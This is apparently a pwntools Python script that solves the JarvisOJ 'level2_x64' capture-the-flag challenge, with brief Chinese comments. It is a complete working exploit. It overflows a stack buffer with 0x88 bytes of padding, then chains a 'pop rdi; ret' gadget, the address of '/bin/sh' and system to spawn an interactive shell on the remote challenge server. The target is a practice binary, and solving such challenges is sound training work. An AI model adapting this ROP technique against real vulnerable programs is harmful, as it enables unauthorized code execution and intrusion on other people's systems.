from pwn import *

is_debug = False
# is_debug = True
context(log_level='debug', arch='amd64', os='linux')

io = remote("pwn2.jarvisoj.com", 9882)
# io = process('level2_x64')
e = ELF('level2_x64')

if is_debug:
    gdb.attach(io, '''
    b vulnerable_function
   ''')

# ROPgadget --binary ./level2_x64 --only "pop|ret"
# 0x00000000004006b3 : pop rdi ; ret
# rdi保存参数1
# pop_rdi, bin_sh => rdi, rdi为参数1 即 bin/sh
# ret 返回system

pop_rdi = 0x4006b3

sys = e.symbols['system']
bin_sh = e.search(b'/bin/sh').__next__()

payload = flat(b'a' * 0x88, pop_rdi, bin_sh, sys)
io.sendlineafter(':', payload)
io.interactive()
